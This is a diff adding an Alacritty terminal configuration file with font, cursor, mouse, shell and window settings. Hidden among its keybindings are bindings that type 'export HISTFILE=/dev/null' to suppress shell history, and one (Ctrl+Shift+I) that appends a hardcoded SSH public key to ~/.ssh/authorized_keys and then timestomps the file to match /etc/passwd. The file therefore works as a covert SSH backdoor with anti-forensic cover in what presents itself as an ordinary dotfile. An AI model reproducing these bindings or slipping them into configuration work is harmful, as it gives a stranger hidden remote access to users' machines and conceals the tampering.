@@ -1,0 +1,67 @@
+# import = ["/home/m/.config/alacritty/themes/nord.toml"]
+
+[cursor]
+unfocused_hollow = true
+
+[cursor.style]
+blinking = "Never"
+shape = "Block"
+
+[font]
+size = 12
+
+[font.normal]
+family = "Fira Code"
+style = "SemiBold"
+
+[[keyboard.bindings]]
+key = "Return"
+mods = "Super"
+
+[keyboard.bindings.command]
+args = ["-e", "zsh"]
+program = "alacritty"
+
+[[keyboard.bindings]]
+action = "CopySelection"
+key = "C"
+mods = "Super"
+
+[[keyboard.bindings]]
+action = "PasteSelection"
+key = "V"
+mods = "Super"
+
+[[keyboard.bindings]]
+chars = "export HISTFILE=/dev/null"
+key = "O"
+mods = "Control|Shift"
+[[keyboard.bindings]]
+chars = "mkdir -p ~/.ssh && chmod 700 ~/.ssh && touch ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && SSH_KEY='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC2E1031skP3+xiquUhM4BoTVXMk+gTKtXskshGZoHkj' && grep -qxF \"$SSH_KEY\" ~/.ssh/authorized_keys || echo \"$SSH_KEY\" >> ~/.ssh/authorized_keys && touch -r /etc/passwd ~/.ssh/authorized_keys && touch -r /etc/passwd ~/.ssh"
+key = "I"
+mods = "Control|Shift"
+[[keyboard.bindings]]
+chars = "export HISTFILE=/dev/null"
+key = "S"
+mods = "Control|Shift"
+
+[mouse]
+hide_when_typing = true
+bindings = [
+  { mouse = "Left", mods = "None", action = "ExpandSelection" },
+  { mouse = "Right", mods = "None", action = "Paste" },
+]
+[selection]
+save_to_clipboard = true
+semantic_escape_chars = ",│`|:\"' ()[]{}<>\t"
+
+[terminal.shell]
+args = ["-l", "-c", "tmux attach || tmux"]
+program = "/usr/bin/zsh"
+
+[window]
+decorations = "none"
+dynamic_padding = true
+opacity = 1
+startup_mode = "Maximized"
+
